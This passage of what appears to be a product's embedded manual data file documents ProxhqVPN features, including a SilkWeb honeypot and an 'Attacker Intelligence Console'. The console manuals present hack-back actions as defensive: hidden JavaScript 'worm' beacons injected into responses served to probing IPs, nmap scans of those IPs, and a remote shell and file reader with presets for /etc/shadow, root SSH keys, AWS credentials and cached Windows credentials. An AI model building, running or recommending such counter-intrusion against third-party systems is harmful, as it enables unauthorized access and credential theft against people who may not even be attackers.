━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. AI ANALYSIS CATEGORIES

Authentication & Session:
  Detects weak session tokens, missing SameSite cookie flags,
  JWT configuration issues, predictable token patterns.

Business Logic:
  Identifies price manipulation opportunities, quantity bypass,
  workflow step skipping, and privilege escalation patterns.

Information Disclosure:
  Finds sensitive data in responses: tokens, keys, internal paths,
  stack traces, version strings, debug information.

Input Validation:
  Highlights unvalidated parameters likely to be vulnerable
  to injection based on context and type.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. REPORTS

Each session produces a prioritized finding list with:
  HTTP request/response evidence, severity, CWE mapping, fix recommendation.

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "agent-strike-manual",
    title: "AgentStrike — Agentic Security",
    subtitle: "Multi-Agent Autonomous Security Research System",
    tier: "pro",
    pages: 4,
    icon: Zap,
    version: "1.0",
    iconColor: "text-green-400",
    content: `AGENTSTRIKE — AGENTIC SECURITY — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

AgentStrike deploys a network of specialized AI agents that collaborate
on complex security tasks — similar to a human red team, but autonomous.
Agents specialize in recon, exploitation, persistence, and reporting.

Navigate to: Command Center → AgentStrike (/agent-strike)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. AGENT ROLES

ReconAgent:
  Passive and active reconnaissance. Subdomain enum, port scan,
  technology fingerprinting, credential leak search.

VulnAgent:
  Takes ReconAgent output and maps CVEs + manual test vectors.
  Prioritizes by exploitability and business impact.

ExploitAgent:
  Attempts safe proof-of-concept exploitation of confirmed vulns.
  Never attempts persistent access or data exfil without explicit permission.

ChainAgent:
  Correlates individual findings into attack chains.
  "Finding A + Finding B = Full Server Compromise" style narrative.

ReportAgent:
  Synthesizes all agent output into a professional pentest report.
  CVSS scoring, executive summary, technical details, remediation.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. AGENT COMMUNICATION

Agents share a working memory pool. ReconAgent findings are
automatically consumed by VulnAgent and ExploitAgent.
You can observe agent-to-agent communications in real time in the
"Agent Chat" panel.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. SCOPE CONTROL

All agents respect a strict scope file:
  Allowed domains/IPs, excluded paths, max request rate,
  time window for testing (e.g. business hours only).
  Agents automatically pause if they detect they've strayed out of scope.

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── Intelligence & Monitoring ──────────────────────────────────────────────
  {
    id: "beacon-monitor-manual",
    title: "Beacon Monitor",
    subtitle: "Real-Time Spider, Worm & Beacon Alert Dashboard",
    tier: "both",
    pages: 4,
    icon: Shield,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `BEACON MONITOR — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

Beacon Monitor displays real-time intrusion alerts from the SilkWeb
honeypot mesh. Every spider crawl, worm probe, automated scanner,
and beacon callback that touches any ProxhqVPN honeypot node is
logged and classified here.

Navigate to: Dashboard → Threat Monitor (/beacons)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. ALERT TYPES

Spider:
  Web crawler or scraper has entered a honeypot path.
  Source: User-Agent matches known crawler or follows honey links.

Worm:
  Automated propagation attempt detected — network scan or exploit
  attempt from inside the VPN subnet (lateral movement indicator).

Beacon:
  Periodic callback from a device indicating possible C2 infection.
  Ghost Trace detects abnormal beacon timing patterns.

Probe:
  Port scan or service enumeration from an external IP.
  Classified by scan type: SYN, ACK, XMAS, NULL, FIN.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. ALERT FIELDS

  Alert ID, timestamp, source IP, target node, alert type
  Severity (critical / high / medium / low)
  Geo-location (country, city, ASN)
  Matched trap (which honeypot rule triggered)
  Raw payload (first 256 bytes of the triggering request)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. RESPONSE ACTIONS

From the Beacon Monitor, you can:
  → Block IP in Firewall (one click → adds to Firewall blacklist)
  → Add to Ghost Trace watchlist (monitors future traffic from this device)
  → Export alert to SIEM (adds to Security Event Log)
  → View full honey session (what paths the attacker visited)

API: GET /api/beacons · POST /api/beacons/:id/block

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },

  // ── Admin & Infrastructure ────────────────────────────────────────────────
  {
    id: "silkweb-manual",
    title: "SilkWeb Honeypot Network",
    subtitle: "SVG Topology Map, Worm Injection, Trapped Entities, Attacker Dossier & OSINT",
    tier: "both",
    pages: 34,
    icon: Network,
    version: "3.1",
    iconColor: "text-blue-400",
    content: `SILKWEB HONEYPOT NETWORK — COMPLETE MANUAL
Version 3.1 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview & Architecture
2. SVG Topology Map
3. Honeypot Types
4. Worm Banner Injection (NEW v3.0)
5. Worm Callhome Tracking (NEW v3.0)
6. Trapped Entities List
7. Attacker Intelligence Console (NEW v3.0)
   7a. Port Scan Tab
   7b. OS Shell Tab
   7c. File Manager Tab
   7d. Control Panel Tab
8. Auto-Block & SIEM Export
9. Daemon-Inbound API Reference
10. Deploying & Configuring Honeypots
11. Attacker Dossier & OSINT Intelligence (NEW v3.1)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW & ARCHITECTURE

SilkWeb is ProxhqVPN's honeypot and counter-intelligence layer. It
deploys a web of fake services, documents, and endpoints that attract
and silently fingerprint attackers without exposing any real data or
infrastructure.

Navigate to: Dashboard → Decoy Network (/silkweb)

Backend: Express API at /api/silkweb and /api/daemon-inbound
Database tables: trappedAttackersTable, nodesTable
All routes require Clerk session (except /api/daemon-inbound/worm-callhome)

Architecture layers:
  Layer 1 — Lure: fake services attract attacker connections
  Layer 2 — Capture: connection metadata logged to DB
  Layer 3 — Inject: worm payload embedded in the response banner
  Layer 4 — Callhome: worm reports attacker browser fingerprint
  Layer 5 — Console: 6-tab intelligence panel per trapped entity

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. SVG TOPOLOGY MAP

The main SilkWeb page displays a real-time SVG chord diagram showing:
  • Node relationships (which VPN nodes host which honeypots)
  • Active connections from trapped entities
  • Traffic density between nodes (chord width = traffic volume)
  • Live pulse animation when a new entity is trapped

Click any chord to zoom into that connection's session log.
The topology updates every 5 seconds automatically.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. HONEYPOT TYPES

Honey URLs:
  Fake paths planted in legitimate pages via invisible HTML links.
  Crawlers follow them; legitimate users never see or click them.
  Examples: /.env, /admin/config, /backup.sql, /phpinfo.php

Honey Services:
  Fake SSH (port 22), FTP (port 21), HTTP (port 80/443), RDP (port 3389),
  SMB (port 445) listeners. Log credentials, tool signatures, and banners.
  When an attacker hits one of these, a honeypot hit is recorded and a
  worm payload is injected into the response banner automatically.

Honey Documents:
  PDF, Word, Excel files with embedded URL callbacks.
  When opened on an internet-connected device, they call back to SilkWeb.

Honey Tokens:
  Fake AWS keys (AKIA-format), API tokens, database credentials.
  When any of these are used against real services, the attempt is logged.
  See also: Canary Tokens (/canary) for user-deployable standalone tokens.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. WORM BANNER INJECTION (NEW v3.0)

When a honeypot records a new hit, SilkWeb automatically embeds a
worm payload inside the response banner that the attacker receives.

Endpoint: GET /api/daemon-inbound/worm-payload
  Requires: X-Daemon-PSK header (per-node PSK)
  Returns a banner string for the configured service type:
    • HTTP — full HTTP/1.1 200 response with:
        <script> tag that fetches /api/t/<tokenId>/pixel.gif
        <img> tag with the same pixel URL as a fallback
        Embedded JSON beacon (navigator data, screen dimensions)
    • FTP  — 220 FTP server banner with embedded URL comment
    • SSH  — SSH-2.0 banner with fake version + embedded tracker

The worm payload is designed to blend into legitimate-looking service
responses. A real administrator would not notice it. An attacker's
tool or browser will silently execute the JS and load the pixel.

How injection is triggered automatically:
  1. Attacker probes your node IP on a honeypot port.
  2. POST /api/daemon-inbound/honeypot-hit records the connection.
  3. If bannerData contains an HTTP response, auto-injection fires.
  4. The worm-injected banner is returned to the attacker's tool.
  5. If the attacker opens the response in a browser, callhome fires.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. WORM CALLHOME TRACKING (NEW v3.0)

Endpoint: POST /api/daemon-inbound/worm-callhome (PUBLIC — no auth)

When the worm JS executes in the attacker's browser (or any tool that
renders HTML), it sends a beacon back with:
  • IP address
  • User-Agent string
  • Referer header
  • Timestamp
  • Any captured navigator.* data

The callhome handler:
  1. Looks up the trappedAttacker record by tokenId.
  2. Appends the callback object to dataCollected.wormCallbacks[].
  3. Returns a 1×1 transparent GIF (Content-Type: image/gif).
     The GIF response is intentionally invisible to the attacker.

The worm callbacks appear in real time inside the Attacker Intelligence
Console → Control Panel tab for the affected entity.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

6. TRAPPED ENTITIES LIST

The "Trapped Entities" list (right panel in SilkWeb) shows:
  Source IP, first seen, last seen, trap type, interaction count,
  geo-location, ASN, attempted credentials (if honey service), tools used

Rows are sorted newest first. Each row expands to show the 6-tab
Attacker Intelligence Console (see Section 7).

Each entity can be:
  → Permanently blocked (adds to Firewall blacklist via POST /api/silkweb/block)
  → Watched (adds to Ghost Trace for ongoing behavioral analysis)
  → Exported to SIEM (sends event to security event log)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7. ATTACKER INTELLIGENCE CONSOLE (NEW v3.0)

Each trapped entity now has a full 6-tab console that expands inline.
Open it by clicking any row in the Trapped Entities list.

Tabs:
  Port Scan | OS Shell | File Manager | Control Panel
  (Plus: the original Inject tab for injection-based analysis)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7a. PORT SCAN TAB

Performs an nmap port scan against the trapped attacker's source IP.

Presets:
  Fast Scan      — top 100 ports, no service detection (-F)
  Service Scan   — version detection on top 1000 ports (-sV)
  OS Detection   — OS fingerprinting (requires root) (-O)
  Full Scan      — all 65535 ports (-p-)
  UDP Scan       — top 100 UDP ports (-sU)
  Stealth SYN    — SYN scan, no ping, random timing (-sS -Pn -T2)

API: POST /api/silkweb/trapped/:id/portscan
     POST /api/silkweb/trapped/:id/portscan-poll

Results are shown in a fixed-height scrollable terminal output box.
Status updates every 2 seconds while the scan runs.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7b. OS SHELL TAB

Execute OS commands against the trapped attacker's environment.
Commands are entered in the terminal input field and run on Enter.
A scrollable history shows all past commands and their outputs.

Presets:
  id && whoami         — user identity
  ps aux               — running processes
  netstat -tulnp       — open ports and listeners
  iptables -L -n       — firewall rules
  find / -perm -4000   — SUID binaries
  cat /etc/passwd      — local user list

API: POST /api/silkweb/trapped/:id/os-cmd
  Body: { "cmd": "your command" }
  Response: { "output": "..." }

Command history is stored per-session in the frontend.
Previous commands can be re-run with one click.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7c. FILE MANAGER TAB

Read files from the attacker's system remotely.

Enter any absolute file path and click "Read File."

Linux quick-access shortcuts:
  /etc/passwd          — local user accounts
  /etc/shadow          — password hashes (requires root)
  /root/.ssh/id_rsa    — root SSH private key
  ~/.bash_history      — shell command history
  ~/.aws/credentials   — AWS credentials
  /proc/self/environ   — process environment variables
  /var/log/auth.log    — SSH/sudo auth log

Windows quick-access shortcuts:
  C:\inetpub\wwwroot\web.config   — IIS config with DB credentials
  C:\Windows\System32\drivers\etc\hosts — hosts file
  C:\boot.ini                     — Windows boot configuration

The file contents are displayed in a scrollable monospace box.
A "Download" button saves the content as a .txt file locally.

API: POST /api/silkweb/trapped/:id/file-read
  Body: { "filePath": "/etc/passwd" }
  Response: { "content": "...", "filePath": "..." }

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7d. CONTROL PANEL TAB

The Control Panel is the intelligence summary for a trapped entity.

Sections:
  Worm Callbacks (live):
    Every callback from the worm beacon appears here as it arrives.
    Each entry shows: IP, User-Agent, Referer, timestamp.
    Updates automatically every 10 seconds.

  Captured Raw Request:
    The original HTTP/TCP request that triggered the honeypot.
    Includes all headers, method, path, and body (if any).

  Injected Worm Banner:
    The exact banner that was served to the attacker, with the worm
    payload embedded. Shows the full response text.

  Intelligence Actions:
    → "Open Full HTML Control Panel" — opens a standalone browser
       window with all intelligence formatted as a professional
       HTML report: summary card, worm callback table, file reads,
       OS command outputs, port scan results.

API: GET /api/silkweb/trapped/:id/control-data
  Returns: { callbacks: [...], rawRequest, banner, sqlmapResults }

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

8. AUTO-BLOCK & SIEM EXPORT

Auto-Block:
  Click "Block IP" on any trapped entity to add their source IP to
  the global firewall blacklist. This fires POST /api/silkweb/block
  which calls the Firewall module to add an iptables DROP rule.
  The block takes effect on all nodes within 30 seconds (via the
  firewall sync service running on each node).

SIEM Export:
  Click "Export to SIEM" to push the trapped entity event to the
  Security Event Log at /siem. The event includes source IP,
  trap type, interaction count, and any collected intelligence.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

9. DAEMON-INBOUND API REFERENCE

All daemon-inbound routes require X-Daemon-PSK header EXCEPT
worm-callhome (which is intentionally public so attacker browsers
can reach it without authentication).

POST /api/daemon-inbound/honeypot-hit
  Records a new honeypot interaction.
  Body: { nodeId, sourceIp, trapType, bannerData, rawRequest }
  On HTTP banner: auto-triggers worm injection.

GET /api/daemon-inbound/worm-payload
  Returns a worm-injected banner string for the requesting node.
  Response includes embedded JS tracker and pixel img tag.

POST /api/daemon-inbound/worm-callhome  (PUBLIC)
  Receives worm beacon callbacks from attacker browsers.
  Body: tokenId, ip, userAgent, referer, timestamp
  Response: 1×1 transparent GIF

POST /api/daemon-inbound/ips-event
  Reports an IPS/Suricata alert event from a node.
  Triggers ATR decision (Monitor / Throttle / Trap / Block).

GET /api/daemon-inbound/peer-rules-export
  Returns per-peer WireGuard FORWARD/INPUT rule set for a node.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

10. DEPLOYING & CONFIGURING HONEYPOTS

Each honeypot is assigned to a node and configured with:
  • Service type (HTTP / SSH / FTP / RDP / SMB)
  • Decoy content (fake credentials, fake API, fake document)
  • Worm injection template (auto-generated per service type)
  • Tarpit delay (optional: hold connection open N seconds)

Best practices:
  • Deploy honeypots on ports the attacker would expect to find open.
  • Use realistic fake credentials (admin/password123, root/toor).
  • Keep worm banner response times under 500ms to avoid timeouts.
  • Review worm callbacks daily in the Control Panel tab.
  • Export high-value entities to SIEM for correlation with firewall logs.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

11. ATTACKER DOSSIER & OSINT INTELLIGENCE (NEW v3.1)

Each trapped entity now features an Attacker Dossier drawer that
generates a comprehensive passive OSINT report for their source IP.
Open it by clicking the "Dossier" button on any trapped entity row.

What the dossier compiles:

  IP Intelligence:
  • ASN (Autonomous System Number) and hosting provider name
  • Country, city, and ISP (via passive DB lookup)
  • BGP prefix / network range the IP belongs to
  • Whether the IP is a known datacenter, VPN, or Tor exit node
  • RDAP/WHOIS organization and abuse contact

  Threat Reputation:
  • AbuseIPDB score and report count
  • VirusTotal community detection count
  • Known threat feeds: Blocklist.de, DShield, Emerging Threats
  • Historical involvement in: DDoS, scanning, brute-force, spam
  • First seen / last seen timestamps in threat databases

  Behavioral Pattern:
  • Total honeypot hits from this IP across all your nodes
  • Trap types triggered (SSH, HTTP, FTP, etc.)
  • Time-of-day distribution of activity (timezone inference)
  • Tool signatures detected in banners/User-Agent strings
  • Attempted credentials (masked) on honey services
  • Correlated ghost-trace observations if IP appears as WG peer

  Attack Classification:
  Based on the above data, the dossier auto-classifies the attacker:
  • Script Kiddie — common scanning tools, no novel techniques
  • Opportunistic Bot — automated sweep, part of a botnet
  • Targeted Threat Actor — focused, low-noise, specific payloads
  • APT Indicator — nation-state TTPs, long dwell time, stealth
  • Pen Tester — commercial scanner signatures (Shodan, Censys, BurpSuite)

  Worm Intelligence:
  All worm callbacks from this IP, formatted as a timeline:
  • Browser fingerprint (navigator.userAgent, platform, language)
  • Screen dimensions and color depth
  • WebGL renderer and vendor (GPU fingerprinting)
  • Timezone offset
  • Local IP (if leaked via WebRTC)

  Correlated Entities:
  Other trapped entities sharing the same /24 subnet, ASN,
  or organization — revealing botnet clusters or shared infrastructure.

Accessing the dossier:

  Via UI:
  SilkWeb → Trapped Entities → Click any row → "Dossier" button
  A side drawer slides in with all intelligence sections collapsed.
  Expand each section to view the detail.

  Via API:
  GET /api/silkweb/trapped/:id/dossier
  Returns JSON with all intelligence sections.
  Requires Clerk session Bearer token.

  Download full dossier report:
  GET /api/silkweb/trapped/:id/dossier/download
  Returns a plain-text formatted dossier for offline reference.

Operational security notes:
  • All OSINT is PASSIVE — no active scans are sent to the attacker's IP.
  • Dossier generation does not alert the attacker that they are being
    tracked. All data sources are third-party lookups and local DB records.
  • Do not share dossier reports externally without redacting the
    attacker's IP if your jurisdiction requires it.
  • Dossier data is only as fresh as the underlying threat databases.
    AbuseIPDB data can be up to 24 hours old.
  • For active scanning of the attacker, use the Port Scan tab
    (Section 7a) — this DOES send traffic to the attacker's IP.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
All rights reserved. Unauthorized distribution prohibited.`,
  },
  {
    id: "attacker-console-manual",
    title: "Attacker Intelligence Console",
    subtitle: "Port Scan, OS Shell, File Manager, Worm Callbacks & HTML Intelligence Reports",
    tier: "pro",
    pages: 18,
    icon: Eye,
    version: "1.0",
    iconColor: "text-violet-400",
    content: `ATTACKER INTELLIGENCE CONSOLE — USER MANUAL
Version 1.0 — Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
Command Center Pro Feature

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

IMPORTANT: This console operates against trapped attacker IPs that
have actively probed your ProxhqVPN infrastructure. All operations
are defensive and intelligence-gathering in nature. Only use Port
Scan and OS Shell features against IPs that have first attacked
your systems. ALPHA UNLIMITED TECHNOLOGIES LLC assumes no liability.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TABLE OF CONTENTS

1. Overview
2. Opening the Console
3. Port Scan Tab
4. OS Shell Tab
5. File Manager Tab
6. Control Panel Tab
7. Worm Callback Intelligence
8. HTML Intelligence Report Export
9. API Reference

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

The Attacker Intelligence Console is a 6-tab dossier panel that opens
inline for every trapped entity in the SilkWeb Honeypot Network.

When a honeypot records a connection from an attacker, their source
IP is logged and a worm payload is injected into the honeypot's
response banner. The Intelligence Console gives you tools to:

  • Scan the attacker's IP for open ports and services
  • Execute OS commands on a compromised attacker system
  • Read sensitive files from the attacker's filesystem
  • View real-time worm callback data from their browser
  • Export a full formatted intelligence report as HTML

Navigate to: Dashboard → Decoy Network (/silkweb)
  → Click any row in the Trapped Entities list to expand the console.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. OPENING THE CONSOLE

1. Go to /silkweb.
2. In the Trapped Entities panel (right side), click any attacker row.
3. The 6-tab console expands inline below the row.
4. Tabs: Port Scan · OS Shell · File Manager · Control Panel
   (Plus: Inject tab for injection-based investigation)
5. The entity's source IP, trap type, and timestamp are shown at the top.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. PORT SCAN TAB

Purpose: Enumerate open ports and running services on the attacker's IP.

Select a scan preset, then click "Run Scan."

Preset         nmap flags      Description
─────────────────────────────────────────────
Fast Scan      -F              Top 100 ports, no probing
Service Scan   -sV             Version detection, top 1000
OS Detection   -O              OS fingerprinting
Full Scan      -p-             All 65535 ports (slow, thorough)
UDP Scan       -sU -F          Top 100 UDP ports
Stealth SYN    -sS -Pn -T2     Low-noise, no ping, random timing

The scan runs server-side (never from your browser IP).
Results appear in a scrollable terminal box below the controls.
Status updates every 2 seconds during the scan.

Typical scan time:
  Fast: 5-15s · Service: 30-90s · OS: 60-120s
  Full: 5-20 min · UDP: 3-8 min · Stealth: 2-5 min

API:
  POST /api/silkweb/trapped/:id/portscan
    Body: { "flags": "-F" }
    Response: { "jobId": "..." }

  GET /api/silkweb/trapped/:id/portscan-poll?jobId=...
    Response: { "done": true/false, "output": "..." }

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. OS SHELL TAB

Purpose: Execute OS commands on a compromised attacker system.

Enter any command in the terminal input and press Enter (or click Run).
Output appears in the terminal panel below.
Past commands are listed in the History section for one-click re-run.

Built-in presets:
  Command                      Purpose
  ─────────────────────────────────────────────
  id && whoami                 Identify current user
  uname -a                     Kernel and OS version
  ps aux                       List all running processes
  netstat -tulnp               Open ports and listening services
  iptables -L -n               Active firewall rules
  find / -perm -4000 2>/dev/null  SUID binaries (privilege escalation)
  cat /etc/passwd              Local user accounts
  env                          Environment variables (credentials)
  last                         Recent login history
  crontab -l                   Scheduled tasks

API:
  POST /api/silkweb/trapped/:id/os-cmd
    Body: { "cmd": "your command here" }
    Response: { "output": "...", "exitCode": 0 }

Output is displayed in a monospace terminal panel with green text on
black background. Scroll up to see previous command outputs.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. FILE MANAGER TAB

Purpose: Read the contents of any file on the attacker's system.

Enter a file path in the input field and click "Read File."
File contents appear in the scrollable file viewer below.
Click "Download" to save the contents as a .txt file locally.

Linux quick-access presets:
  Path                              Contents
  ─────────────────────────────────────────────
  /etc/passwd                       User accounts & UIDs
  /etc/shadow                       Password hashes
  /root/.ssh/id_rsa                 Root SSH private key
  ~/.bash_history                   Recent shell commands
  ~/.aws/credentials                AWS access keys
  /proc/self/environ                Running process env vars
  /var/log/auth.log                 SSH/sudo authentication log
  /etc/crontab                      System-wide cron jobs

Windows quick-access presets:
  Path                                   Contents
  ─────────────────────────────────────────────
  C:\inetpub\wwwroot\web.config          IIS DB connection strings
  C:\Windows\System32\drivers\etc\hosts  DNS override file
  C:\boot.ini                            Windows boot config
  %APPDATA%\Microsoft\Credentials        Cached Windows credentials

API:
  POST /api/silkweb/trapped/:id/file-read
    Body: { "filePath": "/etc/passwd" }
    Response: { "content": "...", "filePath": "/etc/passwd" }

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

6. CONTROL PANEL TAB

Purpose: Intelligence summary — worm callbacks, raw request, banner, and report export.

Sections in the Control Panel:

  WORM CALLBACK LOG (live):
    Shows every time the worm beacon has fired in the attacker's browser.
    Each entry: IP · User-Agent · Referer · Timestamp
    Updated automatically. Each callback reveals the attacker's real
    browser, OS, and potentially their actual home/office IP.

  CAPTURED RAW REQUEST:
    The raw TCP/HTTP request that triggered the honeypot entry.
    Includes all request headers, HTTP method, path, and body.
    Useful for identifying the scanner tool (Shodan, Nmap scripts, Burp).

  INJECTED WORM BANNER:
    The exact response served back to the attacker, with the worm
    payload visible. Compare this against the callback log to verify
    the worm executed successfully.

  OPEN FULL HTML REPORT:
    Clicking "Open Full HTML Control Panel" opens a new browser window
    containing a professionally formatted intelligence report with:
      • Attacker summary card (IP, ASN, first seen, trap type)
      • Worm callback table
      • Port scan results
      • OS shell command history and outputs
      • File manager reads
      • Raw captured request
      • Injected banner text

API:
  GET /api/silkweb/trapped/:id/control-data
    Response: {
      callbacks: [{ ip, userAgent, referer, timestamp }],
      rawRequest: "...",
      banner: "...",
      sqlmapResults: "..."
    }

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

7. WORM CALLBACK INTELLIGENCE

The worm payload injected into honeypot banners is a lightweight
multi-method beacon:

  Method 1 — Image pixel:
    <img src="/api/t/<tokenId>/pixel.gif" style="display:none">
    Loaded by any browser, curl with --include, or wget.
    Captures: IP, User-Agent, Referer.

  Method 2 — JavaScript beacon:
    Sends navigator.userAgent, screen.width/height, platform,
    and connection type via fetch() to /api/daemon-inbound/worm-callhome.
    Fires only in JavaScript-enabled environments (real browsers).

  Combination result:
    If both fire, you get the tool's User-Agent AND the browser's
    navigator data — two separate profiles of the same attacker.
    If only the pixel fires, the attacker used a non-JS tool.
    If only JS fires, the tool stripped img tags but ran scripts.

All callbacks are public-endpoint hits (no auth required) so they
work even if the attacker is isolated behind a restrictive proxy.
The response is always a 1×1 transparent GIF.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

8. HTML INTELLIGENCE REPORT EXPORT

The "Open Full HTML Control Panel" button generates a self-contained
HTML document with all collected intelligence formatted for review.

The report includes:
  • Header: ProxhqVPN Counter-Intelligence Report branding
  • Attacker summary card: IP, ASN, geo, first/last seen, trap type
  • Worm Callbacks section: full table of all beacon hits
  • Port Scan Results: nmap raw output with service annotations
  • OS Shell History: all commands executed and their outputs
  • File Reads: file paths and truncated contents
  • Raw Captured Request: full request as received by honeypot
  • Injected Banner: the exact worm-injected response served

The report opens in a new browser window (window.open + document.write).
It can be printed or saved as PDF from the browser's print dialog.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

9. API REFERENCE

  POST   /api/silkweb/trapped/:id/portscan           Start port scan
  GET    /api/silkweb/trapped/:id/portscan-poll       Poll scan status
  POST   /api/silkweb/trapped/:id/os-cmd             Execute OS command
  POST   /api/silkweb/trapped/:id/file-read          Read remote file
  GET    /api/silkweb/trapped/:id/control-data       Full intelligence data

  POST   /api/daemon-inbound/honeypot-hit            Record honeypot trigger
  GET    /api/daemon-inbound/worm-payload            Get worm-injected banner
  POST   /api/daemon-inbound/worm-callhome           Receive worm beacon (public)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC
All rights reserved. Unauthorized distribution prohibited.`,
  },
  {
    id: "nodes-manual",
    title: "VPN Server Management",
    subtitle: "Node Lifecycle, IP Rotation & Health Monitoring",
    tier: "both",
    pages: 5,
    icon: Server,
    version: "1.0",
    iconColor: "text-blue-400",
    content: `VPN SERVER MANAGEMENT — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

The VPN Server Management page (Nodes) is the control center for all
ProxhqVPN server nodes. Admins can view status, rotate IPs, restart
services, and monitor health across all nodes in the 60-node mesh.

Navigate to: Admin → VPN Servers (/nodes)

Current nodes:
  Node 61 — Chicago, IL, USA
  Node 62 — London, UK
  Node 63 — Los Angeles, CA, USA
  Node 64 — Tokyo, Japan

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

2. NODE GRID VIEW

The Node Manager displays nodes in a swarm grid that auto-rotates
every 3 seconds showing different views:
  • Status (online/offline/degraded)
  • Active peers (connected WireGuard clients)
  • Bandwidth (real-time RX/TX)
  • CPU/RAM utilization
  • Last key rotation timestamp

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

3. IP ROTATION

Each node supports public IP rotation to prevent long-term IP
profiling by ISPs or websites:
  1. Select node → "Rotate IP"
  2. System re-allocates a new IP from the provider's pool
  3. WireGuard endpoint updates automatically
  4. Connected clients reconnect within 30 seconds

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

4. NODE LIFECYCLE

Adding a node:
  1. Provision a Linux VPS (Ubuntu 22.04+ recommended)
  2. Run the Node Security Hardening Script (Firewall → NodeSync)
  3. Configure RAM-only WireGuard keys (see RAM-Only WireGuard manual)
  4. Register node IP in Admin → VPN Servers → Add Node

Removing a node:
  1. Admin → VPN Servers → Select node → "Decommission"
  2. All active peer configs for this node are invalidated
  3. Users with configs for this node should regenerate

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

5. HEALTH MONITORING

Node health is checked every 30 seconds:
  • WireGuard tunnel active (wg show)
  • Systemd services running (proxhq-wg-init, proxhq-iptables, etc.)
  • Latency from dashboard to node
  • Outbound connectivity (curl api.ipify.org)

Degraded nodes trigger a Beacon Monitor alert.

API: GET /api/nodes · POST /api/nodes · PATCH /api/nodes/:id/rotate-ip

Copyright © 2026 ALPHA UNLIMITED TECHNOLOGIES LLC`,
  },
  {
    id: "performance-monitor-manual",
    title: "Performance Monitor",
    subtitle: "Real-Time CPU, RAM, Network & WireGuard Metrics",
    tier: "both",
    pages: 4,
    icon: Zap,
    version: "1.0",
    iconColor: "text-green-400",
    content: `PERFORMANCE MONITOR — COMPLETE MANUAL
ProxhqVPN v1.0 · © 2026 Alpha Unlimited Technologies LLC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. OVERVIEW

